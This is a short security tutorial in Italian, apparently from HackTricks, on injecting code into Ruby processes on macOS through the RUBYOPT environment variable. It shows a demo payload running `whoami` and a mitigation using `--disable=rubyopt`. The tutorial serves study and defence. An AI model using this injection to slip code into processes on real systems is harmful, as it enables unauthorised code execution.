# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analizza le opzioni della riga di comando supportate dalla variabile d'ambiente `RUBYOPT` prima di eseguire uno script. Ruby rifiuta l'esecuzione di codice tramite `-e` in `RUBYOPT`, ma `-I` può anteporre una directory di ricerca delle librerie e `-r` può richiedere una libreria. Pertanto, un processo che avvia Ruby con variabili d'ambiente controllate dall'attaccante può essere indotto a caricare codice Ruby controllato dall'attaccante.<sup>[[1]](#references)</sup>

Create `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Crea uno script Ruby benigno come `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Eseguilo con un valore `RUBYOPT` controllato:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Per disabilitare questo comportamento, passa `--disable=rubyopt` (o `--disable-rubyopt`) **prima** del nome dello script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Un'opzione scritta dopo `hello.rb` viene passata allo script in `ARGV`; non disabilita la precedente elaborazione di `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Documentazione di Ruby - Opzioni della riga di comando di Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
